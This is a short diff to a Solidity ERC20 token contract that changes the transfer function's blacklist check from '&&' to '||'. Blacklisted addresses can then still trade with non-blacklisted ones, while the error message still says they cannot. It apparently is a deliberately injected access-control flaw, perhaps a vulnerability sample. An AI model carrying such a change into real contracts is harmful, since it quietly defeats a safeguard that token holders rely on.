@@ -90,7 +90,7 @@ contract ERC20 is Context, IERC20, Ownable {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
 
-        require(_isBlacklisted[sender] == false && _isBlacklisted[recipient] == false, "Blacklisted addresses can't do buy or sell");
+        require(_isBlacklisted[sender] == false || _isBlacklisted[recipient] == false, "Blacklisted addresses can't do buy or sell");
         require(_isWhitelisted[sender] == true && _isWhitelisted[recipient] == true, "Only whitelisted addresses can do buy or sell");
 
         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
